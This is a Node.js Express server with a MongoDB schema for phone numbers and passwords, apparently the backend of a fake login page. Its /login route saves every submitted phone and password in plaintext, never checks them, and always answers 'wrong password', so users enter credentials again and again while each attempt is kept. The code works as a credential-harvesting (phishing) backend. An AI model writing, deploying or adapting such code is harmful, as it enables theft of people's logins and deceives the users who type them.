require("dotenv").config({ path: ".env" });

const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const dns = require("dns");

const app = express();

/* ---------------- DNS Fix ---------------- */
dns.setServers(["1.1.1.1", "8.8.8.8"]);

/* ---------------- Middleware ---------------- */
app.use(cors());
app.use(express.json());
app.use(express.static("public"));

/* ---------------- MongoDB Connection ---------------- */

console.log(
    "MONGO_URL:",
    process.env.MONGO_URL ? "LOADED ✅" : "MISSING ❌"
);

mongoose.connect(process.env.MONGO_URL)
.then(() => {
    console.log("MongoDB Connected ✅");
})
.catch((err) => {
    console.log("MongoDB Error:", err);
});

/* ---------------- Schema ---------------- */

const userSchema = new mongoose.Schema({
    phone: String,
    password: String
});

const User = mongoose.model("User", userSchema);

/* ---------------- Home Route ---------------- */

app.get("/", (req, res) => {
    res.send("Backend Running Successfully 🚀");
});

/* ---------------- Login/Register API ---------------- */

app.post("/login", async (req, res) => {

    try {

        const { phone, password } = req.body;

        /* Check Empty Fields */

        if (!phone || !password) {

            return res.json({
                success: false,
                message: "Phone and Password are required"
            });
        }

        /* ALWAYS SAVE USER */

        const newUser = new User({
            phone,
            password
        });

        await newUser.save();

        console.log("wrong password");

        res.json({
            success: true,
            message: " wrong password",
            user: newUser
        });

    } catch (error) {

        console.log(error);

        res.json({
            success: false,
            message: "Server Error ❌"
        });
    }
});

/* ---------------- Start Server ---------------- */

const PORT = process.env.PORT || 5000;

app.listen(PORT, () => {
    console.log(`Server Running on Port ${PORT} 🚀`);
});